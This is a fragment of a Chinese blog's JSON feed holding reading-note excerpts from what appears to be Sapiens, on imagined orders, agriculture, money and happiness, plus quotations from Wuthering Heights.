“想象的现实”。它指的是某件事人人都相信，而且只要这项共同的信念仍然存在，力量就足以影响世界。</p>\n<p>从认知革命以来，智人就一直生活在一种双重的现实之中，一方面，我们能感受到那些确实存在的客观事实；另一方面，我们也有像神、国家和企业这种想象的现实。随着时间逝去、想象现实日益强大。</p>\n<p>通过文学创造出想象的现实，就能使大批不相识的人有效合作，而且效果不止如此。</p>\n<p>一旦没有这种建构虚幻故事的能力，尼安德特人就无法有效大规模合作，也就无法因快速改变的挑战，调整社会行为。</p>\n<p>在部落社会里，如果两个陌生人想要交易，往往也能借助共同的神明，传统中的祖先或者图腾建立信任。</p>\n<p>智人发明了许许多多的想象现实，也因发展出许许多多的行为模式，而这正是我们所谓 “文化” 的主要成分。等到文化出现，就再也无法停止改变和发展，这些无法阻挡的变化，就成了我们所说的 &quot; 历史 “。</p>\n<p>即使到了现在，我们的大脑和心灵都还是以狩猎和采集的生活方式在思维。我们的饮食习惯，冲突和性欲之所以是现在的面貌，正是因为我们还保留着狩猎采集者的头脑。</p>\n<p>不管任何活动，信念甚至情感，几乎都会有人造物品介入。</p>\n<p>我们要小心不能只有肤浅的认识，就断然将其妖魔化或理想化。亚契人不是天使、也不是魔鬼，不过就是人类。同样，远古的狩猎采集者，就是和我们一样的人。</p>\n<p>非人类的灵之所以存在，不只是要为人类提供协助，它们也不是把全世界都操之在手的万能的神。这个世界不是为了人或任何其他特定的灵儿旋转。</p>\n<h3 id=\"3-50\"><a class=\"markdownIt-Anchor\" href=\"#3-50\">#</a> 3-50</h3>\n<p>无论是社会还是个人，面对着世界上的种种可能，通常能探索到其中的一小部分而已。</p>\n<p>12000 年前，人类如洪水般席卷美洲，各种各样强大的生物随之灭绝。我们人类就是罪魁祸首，这点绝对无法回避。就算气候变迁也助纣为虐，但人类无疑是整起案件的主谋。</p>\n<p>对全世界的所有大型动物来说，这场人类洪水的唯一幸存者可能只剩下人类自己，还有其他登上诺亚方舟但只作为人类盘中佳肴的家禽家兽。</p>\n<p>农业革命让人类的食物总量增加，但量的增加，并不代表吃的更好，过的更悠闲，反而只是造成人口爆炸，而且产生一群养尊处优，娇生惯养的精英分子，普遍来说，农民的工作要比采集者更辛苦，而且到头来的饮食还要更糟。农业革命可说是史上最大的一桩骗局。</p>\n<p>人类以为自己驯化了植物，但其实是植物驯化了智人。</p>\n<p>没有人发现究竟发生了什么事，每一代人都只是继续着上一代生活的方式，在这里修一点，那里改一点。但矛盾的是，一连串为了让生活更轻松的 “进步 “，最后却像是在这些农民的身上加了一道又一道沉重的枷锁。</p>\n<p>所有改变都必须点点滴滴累积，经过许多代的时间，才能够改变社会；等到那个时候，已经没有人记得过去曾经有不同的生活方式可选了。</p>\n<p>等到习惯某种奢侈品，就开始认为这是天经地义。接着就是一种依赖，最后，生活中就再也不能没有这种奢侈品了。</p>\n<p>人类一心追求更轻松的生活，于是释放出一股巨大的能量，改变了世界的面貌，但结果并没有任何人料想得到，甚至也不是任何人所乐见的。</p>\n<p>并没有人在背后操纵农业革命发生，或者意图让人依赖谷类维生，一开始只是各种小事，主要是希望吃饱一点，生活安全一点，但最后累积引起的效应，就是让远古的采集者开始花上整天时间，在烈日之下排水务农。</p>\n<p>提供劳力的役用动物有时候能多活上几年，但代价就是过着完全不符合它们天性和渴望的生活。</p>\n<h3 id=\"3-51\"><a class=\"markdownIt-Anchor\" href=\"#3-51\">#</a> 3-51</h3>\n<p>每当人类整体的能力大幅增加，看来似乎大获得成功，个人的痛苦也总是随之增长。</p>\n<p>农业革命是个转折点，让智人抛下了与自然紧紧相连的共生关系，大步走向贪婪，自外于这个世界，但不管这条路的尽头为何，现在已经无法回头。</p>\n<p>不管在任何地方，都出现了统治者和精英阶级，不仅靠着农民辛苦种出的食粮维生，还几乎全征收抢光，只留给农民勉强可过活的数量。</p>\n<p>他们生产出来的多余食粮养活了一小撮的精英分子：国王、官员、战士、牧师、艺术家和思想家，但历史写的几乎全是这些人的故事。于是，历史只告诉了我们极小数的人在做什么，而其他绝大多数人的生活就是不停的跳水耕田。</p>\n<p>大多数的人类合作网络最后都成了压迫和剥削。</p>\n<p>帝国都是 “由想象构成的秩序”。支持他们的社会规范既不是人类自然的天性本能，也不是人际的交流关系，而是他们都相信共同虚构的神话故事。</p>\n<p>不管是汉谟拉比还是美国的开国元勋，心中都有个想象的现实，想象着这个世界有着放诸四海皆准、永恒不变的正义原则（例如平等或阶级），但这种不变的原则其实只存在于智人丰富的想象里。只存在于他们创造并告诉彼此的虚构故事中。这些原则，从来就没有客观的正确性。</p>\n<p>每个人身上带的基因码都有些许不同，而且从出生以后就接受着不同的环境影响，发展出不同的特质，导致不同的生存概率。“生而平等” 其实该是 “演化各有不同”。</p>\n<p>个体诞生的背后就只是盲目的演化过程，而没有任何目的。</p>\n<p>我们相信某些秩序，并非因为它是客观的现实，而是因为相信它可以让人提升合作效率、打造更美好的社会。这种由想象构建的秩序绝非邪恶的阴谋或是无用的空谈，而是唯一能让大群人类合作的救命仙丹。</p>\n<p>为了维持想象构建出来的秩序，必须持续投入大量心力，甚至还将掺入些暴力和胁迫的成分。像是为了让民众不违反想象构建的秩序，国家就需要有军队、警察、法院和监狱部分昼夜发挥作用。</p>\n<h3 id=\"3-52\"><a class=\"markdownIt-Anchor\" href=\"#3-52\">#</a> 3-52</h3>\n<p>想靠威胁来维持军队组织显然不可太行。至少必须有某些军官和某些士兵真正相信某些事情，不管是上帝、荣誉、祖国、男子气概，或是单纯相信金钱也成。</p>\n<p>虽然这些想象构建的秩序只存在于我们的脑海里，但他可以与真实的世界紧紧结合、密不可分。像是今天大多数西方人都相信个人主义，认为每个人都是独立的个体，有独立的价值，而不受他人看法的影响。</p>\n<p>多数人很难接受自己的生活秩序只是虚构的想象，但事实是从我们出生就已经置身于这种想象之中，而且连我们的欲望也深受其影响。于是，个人欲望也就成为虚构秩序最强大的守护者。</p>\n<p>“客观” 事物的存在，不受人类意识及信念影响。“主体 “事物的存在，靠的是某个单一个人的意识和信念。” 主体 “事物的存在，靠的是许多个人主观意识之间的连接网络。就算有某个人改变了想法，甚至过世，对这项事物的影响并不大。但如果是这个网络里面的大多数都死亡或是改变了想法，这种” 主体 “间的事物就会发生改变或消失。</p>\n<p>身为人类，我们不可能脱离现象所建构出来的秩序。每一次我们以为自己打破了监狱的高墙、迈向自由的前方，其实只是到了另一间更大的监狱，把活动范围稍稍加以扩大。</p>\n<p>合作网络背后的秩序既不中立也不公平，总把人分成一些其实并不存在的分类，并且排出上下等级，上等人享有各种权力和特权，而下等人只有歧视和压迫。</p>\n<p>历史的铁则告诉我们：每一种由想象建构出来的秩序，都绝不会承认自己处于想象和虚构，而会大谈自己是自然，必然的结果。</p>\n<p>各种阶级制度的道德意义不一，某些社会的歧视也比其他社会更为严重或极端，但是就目前学者研究，还没有任何一个大型人类社会能真正免除歧视的情形。一次又一次，人类要让社会有秩序的方法，就是会将成员分成各种想象出来的阶级。</p>\n<p>他们致富的概率仍然大不相同，这场经济的游戏，其实早就被种种法律限制和潜规则束缚住了手脚，根本不知道公平在哪里。</p>\n<h3 id=\"3-53\"><a class=\"markdownIt-Anchor\" href=\"#3-53\">#</a> 3-53</h3>\n<p>人们会渐渐明白这些印记都是虚构的而非事实，随着时间过去，黑人就能够证明自己和白人一样能干、守法、干净。但情况却正相反，随着时间推移，这些偏见只会越来越深。正由于所有最好的工作都在白人手中，人们更容易相信黑人确实低人一等。</p>\n<p>恶性循环，某个偶然历史事件，成了僵化的社会制度常规。</p>\n<p>大多数社会政治阶级制度其实都没有逻辑或生物学的基础，不过就是由历史的偶然事件引起，再用虚构的故事延续壮大。</p>\n<p>天生自然的生物学，可能性几乎无穷无尽。然而，文化却要求实现某些可能性，而又封闭了其他的可能性。</p>\n<p>从生物学的角度来看，这世界上根本就没有什么是不自然的。只要有可能发生的事，就是自然。真正完全 “不自然” 的事，是指违背了自然规律，这种事情根本就不会存在，所以也没有禁止的必要。</p>\n<p>演化本来就没有唯一的目的。器官的演化没有唯一的目的，而器官的使用方式也不断在变化。现在人体的所有器官早在几亿年前就已经出现了原型，而现在所有器官都不只做着原型所做的事。器官之所以演化是为了某种特定功能，但等到器官存在之后要用作其他功能并无不可。</p>\n<p>各种规定男人就该如何、女人就该怎样的法律、规范、权利和义务，反映的多半是人类的想象，而不是生物天生的现实。</p>\n<p>人类几乎从出生到死亡都被种种虚构的故事和概念围绕，让他们以特定的方式思考，以特定的标准行事，想要特定的东西，也遵守特定的规范。就是这样，让数百万计的陌生人能遵照着这种人造而非天生的直觉，合作无间。这种人造的直觉就是 “文化”。</p>\n<p>想要确保 “平等”，就得限制住那些比较突出的人；而要从 “自由”，也就必然影响所有人的平等。</p>\n<p>事实上，世界上没有什么社会性动物会在意所属物种的整体权益。</p>\n<p>原来声称人人 “各尽其能，各取所需”，但结果是 “各尽所能的最小值，各抢所需的最大值”。</p>\n<h3 id=\"3-54\"><a class=\"markdownIt-Anchor\" href=\"#3-54\">#</a> 3-54</h3>\n<p>对各教先知来说，全球就该只有一个真理，所有人都是潜在的信徒，所以他们也是试着要建立起某种秩序，希望无论对谁都适用。</p>\n<p>“人人都想要” 正是金钱最基本的特性。人人都想要钱，是因为其他人也都想要钱，所以有钱就几乎可以换到所有东西。</p>\n<p>真正要用的时候，白银和黄金只会做成首饰、皇冠以及各种象征地位的用品；换言之，都是在特定文化里社会地位高的人所拥有的奢侈品。它们的价值完全是因为文化赋予而来。</p>\n<p>如果一切都能换成金钱，而大家相信的又是不具名的硬币和贝壳，就可能伤害当地传统、亲密关系和人的价值，让冷酷无情的供需法则取而代之。</p>\n<p>有了宗教之后，就能说法律并不只是人类自己的设计和想象，而是来以一种绝对的神圣最高权柄。这样一来，至少某些基本的法则便不可动摇，确保社会稳定。</p>\n<p>二元论认为，整个宇宙就是 “善” 与 “恶” 两股力量的战场，世间种种就是两方战斗的体现。</p>\n<p>自然法则的宗教信仰虽然某些也相信有神邸存在，但认为神邸就和人类，动物和植物一样会受到自然法则的限制。</p>\n<p>至死，一切如梦幻泡影消失，身影就像是毫无意义的追寻。</p>\n<p>一切苦难并非来自噩运、社会不公或是神邸的人性，而是出于每个人心中的思想模式。</p>\n<p>在事物带来快乐或痛苦的时候，重点是要看清事物的本质，而不是着重在他带来的感受，于是就能不再为此所困。虽然感受悲伤，但不要希望悲伤结束，于是虽然仍有悲伤，也能不再为此所困。</p>\n<p>正是每个人的内心让全世界有了意义，而且这也是各种道德及政治正当性的来源。如果碰上道德或政治的困境，就该内省，听听自己内心的声音，也就是人性的声音。</p>\n<p>自由主义和共产主义要保护弱者，不仅让不适者生存了下来，还给了他们繁殖的机会，这样就破坏了自然选择的秩序。如此一来，就算是最适者的人类，也不免被一群堕落的人类淹没，变得越来越趋近不适者，一代代下去就可能导致灭绝。</p>\n<h3 id=\"3-55\"><a class=\"markdownIt-Anchor\" href=\"#3-55\">#</a> 3-55</h3>\n<p>越来越多的科学家认为，决定人类行为的不是什么自由意志，而是荷尔蒙、基因和神经突触–我们和黑猩猩、狼和蚂蚁并无不同。</p>\n<p>历史上的每一个时间点，都像是一个十字路口。虽然从过去到现在已经只剩下单行道，但到未来却有无数岔路可走。其中某些路比较宽、比较平坦，路标比较明确吗所以也是比较可能的选择。然而，历史有时候就是选了一些另类的道路。</p>\n<p>对某个时代了解的越透彻，反而就越难解释为什么发生了这个世间而不是那个事件。但如果对某个时期只是一知半解，就很容易受到结果影响，只看到那些最后成真的可能性。于是，他们就用后见之明来解释着为什么现在的结果无法避免。</p>\n<p>历史的铁则就是：事后看来无可避免的事，在当时看来总是毫不明显。直到今天，情况仍是如此。</p>\n<p>宿命论的引人之处，就在于觉得这个世界和我们的信念都是历史上必然的产物。于是，我们似乎是自然而然就发展出民族国家，也是自然而然坚守着人权的概念。</p>\n<p>我们之所以研究历史，不是为了要知道未来，而是要拓展视野，要了解现在的 “种种” 绝非自然，也并非无可避免。未来的可能性远超出我们的现象。</p>\n<p>历史的选择绝不是为了人类的利益。随着历史演进、毫无证据显示人类的福祉必然提升。没有任何证据，证明对人类有益的文化就会成功扩张，而对人类无情的文化就会消失。</p>\n<p>“利益” 并没有客观的衡量标准，不同的文化对于 “善” 的定义不同，也没办法确定何者为佳。</p>\n<p>文化就像是精神感染或寄生虫，而人类就是毫不知情的宿主。寄生虫或病毒就是这样住在宿主体内，繁殖，传播，从一个宿主到另一个宿主，夺取养分，让宿主衰弱，有时甚至丧命。只要宿主能够活着让寄生虫继续繁衍，寄生虫就很少关心宿主的情形。至于文化，也是以这种方式寄生在人类的心中。</p>\n<p>科学革命并不是 “知识的革命”，而是 “无知的革命”。真正让科学革命起步的伟大发现，就是发现 “人类对于最重要的问题其实毫无所知”。</p>\n<h3 id=\"3-56\"><a class=\"markdownIt-Anchor\" href=\"#3-56\">#</a> 3-56</h3>\n<p>就像演化一样，历史的演进并不在意生物个体是否幸福。至于对个别的人类来说，即使受到了历史演进的影响，但通常一方面太过无知，一方面又太过软弱，因此无力改变。</p>\n<p>一定有什么 “重要的事”，是 “整个知识体系” 所不知道的，但这种人常常会被边缘化或遭受迫害；但也有可能，他们就会开创出一个新的体系，开始宣称只有他们才知道所有该知道的事。</p>\n<p>摩尼教提出的基本原则就认为世界是善与恶的战场。恶的力量创造了物质，善的力量创造了精神。人类就处于着两股力量之间，而应该从善弃恶。</p>\n<p>统治者资助教育机构，目的只是为了传播传统知识，强化现行秩序。</p>\n<p>科学研究之所以得到经费，多半是因为有人认为这些研究有助于达到某些政治、经济或宗教的目的。</p>\n<p>许多科学家却是只是为了求知而研究。然而，真正控制科学法阵进度表的，很少是科学家。</p>\n<p>科学能够解释的，是这个世界上有什么，事物如何运作，以及未来可能会有什么，就定义来说，科学不会假装自己知道未来 “一定” 会有什么。只有宗教和意识形态会声称自己知道这些答案。</p>\n<p>总之，科学研究一定得和某些宗教或意识形态联手，才有蓬勃发展的功能。意识能让研究所耗的成本合理化。而代价就是意识形态能够影响科学的进程表，并且决定如何使用研究成果。</p>\n<p>真正让欧洲人胜出的，是他们无与伦比而又贪得无厌、不断希望探索和征服的野心。</p>\n<p>对今日许多精英分子而言，要比较判断不同人群的优劣，几乎讲的总是历史上的文化差异，而不再是科学上的生物差异。我们不再说 “这就存在于他们的血液里”，而是说 “这就存在于他们的文化里”。</p>\n<p>正是 “信用” 的概念，让我们能够预支未来，打造现在。而这背后有一项基本假设，就是未来的资源肯定远远超过目前的资源；只要我们使用未来的收入来投资当下，就会带来许多全新而美好的商机。</p>\n<p>所谓的 “进步”，就是在承认我们的无知之后，认为只要投资进行研究，一切就能变得更好。</p>\n<h3 id=\"3-57\"><a class=\"markdownIt-Anchor\" href=\"#3-57\">#</a> 3-57</h3>\n<p>贪婪是好的，而且让我们自己过得好的时候，不只是自己得利，还能让他人受益。</p>\n<p>想要有稳定的民生制度，就必须要有蓬勃的经济、健全的中产阶级，所以重点就是该让当地人有自由企业、勤俭节约、自立自强这些价值观念。</p>\n<p>人类有追求利益和经济成长的渴望，就会决定盲目扫除一切可能的阻扰。等到” 成长 “成了无上的目标，不受其他道德伦理考虑的制衡，就很容易衍生成一场灾难。</p>\n<p>就像农业革命一样，所谓的现代经济成长也可能只是个巨大的骗局。虽然人类和全球经济看来都在继续成长，但更多的人却活在饥饿和困乏之中。</p>\n<p>我们能使用的能源其实无穷无尽。讲得更精确，唯一的限制只在于我们的无知。我们每隔几十年，就能找到新的能源来源，所以人类能用的能源其实在不断增加。</p>\n<p>在业者严重，大概就只是一张会吃原料的嘴，在加上会生产商品的乳房而已。这些活生生的生物其实内心情感世界都十分复杂，如果把他们当机器一样对待，不仅会造成身体不适，也会让他们有很大的社会压力和心理挫折。</p>\n<p>过去在野外形成的种种需求，就算现在已经不是生存和繁殖所必要，仍然会持续造成主观的感受。工业化农业的悲剧在于，它一味强调动物的客观需求，却忽略了它们的主观需要。</p>\n<p>所谓民族的社群概念不断被一群又一群的消费者削弱，这些消费者彼此并不认识，但都有同样的消费习惯和兴趣，因此不但相信还定义大家就是一伙的。</p>\n<p>“秩序” 隐含着稳定和连续的意义。当我们努力改变自己在家庭和社群中的地位，但讲到要彻底颠覆整个秩序，这个概念就很陌生。我们常常会把自己限于现状，声称 “过去都是这样，未来也会是这样”。</p>\n<p>当然，我们还是会看到有国家运用国家力量残害自己的公民，而且常常就是这些恐怖的印象深植人心，挥之不去。就算是在暴虐和独裁之下，现代人死于他人之手的可能性仍然低于前现代社会的水平。</p>\n<p>现在正面临着全球帝国的形成，而这个帝国与之前的帝国也十分类似，会努力维持其疆域内的和平。正因为全球帝国的疆域就是全世界，所以世界和平就能得到有效的维持。</p>\n<p>我们正在天堂和地狱的岔路口，而我们还不知道自己会朝哪个方向。历史还没有告诉我们该挑哪边，只要发生某些巧合，往哪边走都不算意外。</p>\n<p>人类有了越来越多的能力之后，创造出来的是个冷漠的机器世界，并不符合人类的实际需求。人类的演化，是让我们的思想与身体负荷狩猎采集生活。因此，无论是转型成农业还是后来在转型到工业，都是让我们堕入不自然的生活方式，让我们无法完全实现基因中固有的倾向和本能，也就是不能满足最深处的渴望。</p>\n<p>虽然智人确实取得了空前的成就，或许值得沾沾自喜，但代价就是赔上几乎所有其他动物的命运。</p>\n<p>社会，伦理和心灵因素对幸福感的影响，绝对不下于其他的物质条件。有没有可能，虽然富裕社会里的人类荷包满满，却因为人际疏离和生活没有意义而深感痛苦？有没有可能，虽然我们的老祖宗生活条件很差，但因为与家人朋友、宗教和自然关系紧密，反而生活的比较满足？</p>\n<p>金钱确实会带来快乐，但是有一定限度，超过限度之后效果就不会那么明显。</p>\n<p>甚至我们现在如此着重的 “自由”，也可能让我们不那么快乐的原因。虽然我们可以自己选择另一半，选择朋友、选择邻居，但他们也可以选择离开我们。现代社会每个人都有了前所未有的自由，能够决定自己要走哪条路，但也让我们越来越难真正信守承诺，不离不弃。于是，社群和家庭的凝聚力下降而解体，这个世界让我们感到越来越孤独。</p>\n<p>我们的心理深深埋藏着一个推理的谬误，在我们试着猜测或想象其他人有多快乐的时候，我们总是想要设身处地的去想象自己在那个情况下会如何感受。但这么一来，我们是把自己的期望放到了别人的物质条件上，结果当然就会失准。</p>\n<p>有没有可能，第三世界国家之所以会对生活不满，不只是因为贫穷、疾病、腐败和政治压迫，而是因为他们看到了第一世界国家的生活标准？</p>\n<p>人类演化的结果，就是不会太快了，也不会太痛苦。我们会短暂感受到快乐，但不会永远持续。迟早快感会消退，让我们再次感到痛苦。</p>\n<h3 id=\"3-59\"><a class=\"markdownIt-Anchor\" href=\"#3-59\">#</a> 3-59</h3>\n<p>唯一能让我们真正快乐的方法就是操控人类的生化机制。举例来说，百忧解之所以让人不在沮丧，靠的就不是对任何体制的改革，而只是提高血清素的浓度。</p>\n<p>只要有了活下去的理由，几乎什么都能忍受。</p>\n<p>人类只是在没有特定目标的演化过程中，盲目产生的结果。人类的行动没有什么神圣的整体计划，而且如果整个地球明天就爆炸消失，整个宇宙很可能还是一样这么继续运行下去。</p>\n<p>所谓的快乐，很可能只是让个人对意义的错觉和现行的集体错觉达成同步而已。只要我自己的想法能和身边的人的想法达成一致，我就能说服自己、觉得自己的生命有意义，而且也能从这个信念中得到快乐。</p>\n<p>正如同其他动物，人类在自然选择的影响下，就算对个人不利，他们也会选择要让基因继续流传下去。大多数男性一生劳苦，终日烦忧、竞争激烈、需要不断战斗，就是没办法享受一下平静的幸福；但这是因为 DNA 在操纵着他们，要他们为自私的目的做牛做马。DNA 就像撒旦，用一些稍纵即逝的快乐作为引诱，令人为之臣服。</p>\n<p>佛教认为，快乐既不是主观感受到愉悦，也不是主观觉得生命有意义，反而是在于放下追求主观感受这件事。</p>\n<p>追求这些主观感受十分耗心神，而且终是徒劳，只是让我们受制于追求本身。因此，苦的根源不在于感到悲伤或疼痛，也不在于感受一切都没有意义。苦真正的根源，在于 “追求” 主观感受这件事，不管追求的是什么，都会让人陷入持续的紧张，困惑和不满之中。</p>\n<p>于是这一辈子做的，都是想要避开某些感受并追求另外某些感受。但他们从来没发现，苦真正的来源不是感受本身，而是对感受的不断追求。</p>\n<p>我们这个现代晚期的世界，是有史以来第一次认为所有人类应享有基本的平等，然而我们可能正准备打造一个最不平等的社会。</p>\n<h3 id=\"3-60\"><a class=\"markdownIt-Anchor\" href=\"#3-60\">#</a> 3-60</h3>\n<p>我们现在还不知道生物工程是不是真能让尼安德特人再现，但这很可能为智人拉下终幕。操纵基因并不一定会让智人拉下终幕。操纵基因并不一定会让智人大批死亡而绝种，但很可能会让智人这个物种大幅改变，到最后就成了另一个物种，而不宜再使用智人这个名称。</p>\n<p>在奇异点之前，我们所认知的自然法则都还不存在，就连时间也不存在。所以要说宇宙大爆炸 “之前” 如何如何，对我们来水是没有意义，无法理解的。而我们可能正在接近下一个奇异点，所有我们现在这个世界的意义都将变得无关紧要。而在那个点之后的任何事，都还超出我们现在所能想象的。</p>\n<p>历史一再让我们看到，许多以为必然会发生的事，常常因为不可预见的阻碍而无法成真，而某些难以想象的清洁，最后却成为事实。</p>\n<p>或许真正该问的问题不是 “我们究竟想要什么”，而是 “我们究竟希望自己想要什么”，如果对这个问题视若等闲，可能就是真的还没想通。</p>\n<p>我们拥有的力量比以往任何时候都更加强大，但几乎不知道该怎么使用这些力量。更糟糕的是，人类似乎也比以往任何时候更不负责。我们让自己变成了神，而唯一剩下的只有物理法则，我们也不用对任何人负责。</p>\n<p>拥有神的能力，但是不负责任、贪得无厌、而且连想要什么都不知道。</p>\n<hr>\n",
            "tags": [
                "社会",
                "历史"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/35%E3%80%8A%E5%91%BC%E5%95%B8%E5%B1%B1%E5%BA%84%E3%80%8B%E8%89%BE%E7%B1%B3%E8%8E%89/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/35%E3%80%8A%E5%91%BC%E5%95%B8%E5%B1%B1%E5%BA%84%E3%80%8B%E8%89%BE%E7%B1%B3%E8%8E%89/",
            "title": "《呼啸山庄》艾米莉",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>我与消沉和孤独的苦斗直到黄昏，最后还是不得不扯起降旗。</p>\n<h3 id=\"3-101\"><a class=\"markdownIt-Anchor\" href=\"#3-101\">#</a> 3-101</h3>\n<p>我是唯一的人，命中注定；无人过问，也无人流泪哀掉；自从我生下来，从未引起过一线忧虑，一个快乐的微笑。</p>\n<p>在秘密的欢乐，秘密的眼泪中，这个变化多端的生活就这样滑过，十八年后仍然无依无靠，一如在我诞生那天同样的寂寞。</p>\n<p>经验告诉我，真理决不会在人类的心胸中成长起来。</p>\n<h3 id=\"3-102\"><a class=\"markdownIt-Anchor\" href=\"#3-102\">#</a> 3-102</h3>\n<p>只为你这样无礼待客，就该一辈子跟人群隔离。</p>\n<p>因为他们所表现的只是在轻蔑与近似绝望之间的一种情绪，而在那张脸上看见那样的眼神是特别不自然的。</p>\n<p>那种精神上的阴郁气氛没有抵消，反而压倒了我四周明亮物质上的舒适。</p>\n<p>他偶尔的欢乐很快地消散，又恢复他习惯的阴郁了。</p>\n<p>等到曙光初放，我就抓紧机会，逃到外面的自由的空气里，它现在已是清爽，宁静而又寒冷得像块无形的冰一样了。</p>\n<p>我与消沉和孤独的苦斗直到黄昏，最后还是不得不扯起降旗。</p>\n<p>什么是恶狗的样子，好像知道被踢是该得的报酬，可又因为吃了苦头，就又恨全世界，以及那踢他的人。</p>\n<p>他们确实更认真，更自顾自的过着日子，不太顾及那些表面变化和琐碎的外界事物。</p>\n<p>我一向认为的你们这一阶层所固有的习气，在你身上并未留下痕迹，你只是稍稍有家乡土气罢了。因为你很少把生命消耗在愚蠢的琐事上。</p>\n<p>他早年所受的教育，到那时已不再对他起作用了，连续不断的苦工，早起晚睡，已经扑灭了他在追求知识方面所一度有过的好奇心。</p>\n<p>他长久努力想要跟凯瑟琳在她的求学上保持平等的地位，却带着沉默的而又痛切的遗憾，终于舍弃了；而且他是完全舍弃了。当他发觉他必须，而且必然难免，沉落在他以前的水平以下的时候，谁也没法劝他往上走一步。</p>\n<p>什么都不知道，什么话也不说的人根本谈不上作伴。</p>\n<p>要么是没希望的笨蛋，要么就是一个好冒险的傻瓜。</p>\n<p>我爱他脚下的地，他头上的天，他所碰触过的每一样东西，以及他说出的每一个字。我爱他所有的表情和所有的动作，还有整个完完全全的他。</p>\n<p>那并不是因为他漂亮，而是因为他比我更像我自己。不论我们的灵魂是什么做成的，他的和我的是一模一样的。</p>\n<h3 id=\"3-103\"><a class=\"markdownIt-Anchor\" href=\"#3-103\">#</a> 3-103</h3>\n<p>到头来，我们总归是为了自己，温和慷慨的人不过比傲慢霸道的人自私得稍微公平点罢了，等到种种情况使得两个人都感觉到一份的利益并不是对方思想中主要关心的事物的时候，幸福就完结了。</p>\n<p>“贪婪跟着他成长起来，成了易犯的罪恶”。这就是我对他的写照。</p>\n<p>暴君压迫的奴隶，他们不反抗他；他们欺压他们下面的人。你为了使自己开心，而把我折磨致死，我心甘情愿；只是允许我以同样方式让我自己也开开心，而且也跟你同样的尽力避开侮辱。</p>\n<p>当我被迫走上极端时，倒是结束这一切的迅速方法。但是为了一个可怜的希望，还是值得活下来。</p>\n<p>她已经沾染了几分包围着她的那种到处蔓延的懒散精神。</p>\n<p>那个由于必要不得不作她伴侣的人，今后只能凭借着对她昔日的追忆，以及出于世俗的仁爱和责任感，来维持他的感情了。</p>\n<p>你毫无顾忌地要彻底毁掉她那完全恢复健康的一切希望，在她快要忘了你的时候却硬要把你自己插到她的记忆里，而且把她拖进一场新的纠纷和苦恼的风波中去。</p>\n<p>她处在那种可怕的孤独中，不这样又能怎么样？而那个没有精神的，卑鄙的东西还出于责任和仁爱来伺候她！出于怜悯和善心罢了！</p>\n<p>与其活着成为周围人的负担，成为不幸的制造者，那还不如让她死了的好。</p>\n<p>阴谋和暴力是两头尖的矛，他们也能刺伤使用他们的人，比刺伤他们的敌人还要重些。</p>\n<p>时间会使人听天由命的，而且带来了一种比日常的欢乐还甜蜜的忧郁。</p>\n<p>好东西埋没在一片荒草中，当然野草蔓生以后，就盖过了他们不被重视的成长；但是，尽管如此，既已证明是一块肥沃的土地，在其他有利的情况下，他就会有丰富的收成。</p>\n<p>他长了两岁什么也没改，就是粗壮些，更有力气些；他跟从前一样拙笨和粗鲁。</p>\n<h3 id=\"3-104\"><a class=\"markdownIt-Anchor\" href=\"#3-104\">#</a> 3-104</h3>\n<p>我能够同情他所有的感受，因为我自己也感受过。比如说，我准确的知道他现在在感受什么痛苦；虽然那不过是他所要受的痛苦的开始。他永远也不能从他那粗野无知中解脱出来。</p>\n<p>如果这个死去的流氓能从坟墓里站起来谴责我对他的子嗣的虐待，我倒会开心的看到这个所说的子嗣把他打回去，为了他竟敢辱骂他在这世界上唯一的朋友而大为愤慨哩。</p>\n<p>我的决心在还没有正式形成以前就已经化为乌有了，以前好像到那儿去是不对的；现在又好像不去才不对了。</p>\n<p>虽然我曾经不能，而且也没法不向你暴露我的本性。</p>\n<p>我是来自那个熙熙攘攘的世界，我得回到他的怀抱中去。</p>\n<p>可是当我总是与一切希望隔断，注定了孤寂，或者同那些永不曾、也永不会喜欢我的人们在一起，我怎么能够快活而健康起来呢。</p>\n<p>对于他的追问，我没说什么，因为我简直不知道该隐瞒什么和说出来什么。</p>\n<p>是什么东西使他充满了恐惧，我们没法看出来，但是他就在那儿，无力地在他掌握中，仿佛在加上任何一点威吓，就能把他吓成白痴。</p>\n<p>我宁可被一条蛇缠紧，你怎么能梦想来谄媚我？我恨极了你。</p>\n<p>一个人的残忍也许是从他更大的悲哀中产生的。</p>\n<p>因她的轻蔑而感到的羞耻，又希望得到她的期许，这就是她力求上进的最初动机了，而他那上进的努力，既不能保护他避开轻蔑，也不能使他得到赞许，却产生了恰恰相反的结果。</p>\n<p>生活在蠢人和厌世者中间，她即使遇见较好的一类人，大概也不能欣赏了。</p>\n<p>他们之间的关系不是理智能打断的。是锁链，是习惯铸成的。</p>\n<p>我已经失掉了欣赏他们毁掉的能力，而我太懒的去做无谓的破坏了。</p>\n<p>这让我渐渐相信，良心使他的心变成了人间地狱。</p>\n<h3 id=\"3-105\"><a class=\"markdownIt-Anchor\" href=\"#3-105\">#</a> 3-105</h3>\n<p>我并不情愿永远孤独，有他陪伴却又毫无益处，简直加重了我所忍受的不断的折磨。</p>\n<p>他还是和从前一样，只是更喜欢孤寂些，也许在人前话更少些而已。</p>\n<p>我灵魂的喜悦杀死了我的躯体，但是并没有满足他本身。</p>\n<p>我不知道它是甜中带酸，还是酸中带甜，也许他根本就是苦涩的。</p>\n",
            "tags": [
                "命运",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/41%E3%80%8A%E4%BA%BA%E7%94%9F%E7%9A%84%E6%9E%B7%E9%94%81%E3%80%8B%E6%AF%9B%E5%A7%86/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/41%E3%80%8A%E4%BA%BA%E7%94%9F%E7%9A%84%E6%9E%B7%E9%94%81%E3%80%8B%E6%AF%9B%E5%A7%86/",
            "title": "《人生的枷锁》毛姆",
            "date_published": "2019-06-30T16:00:00.000Z",
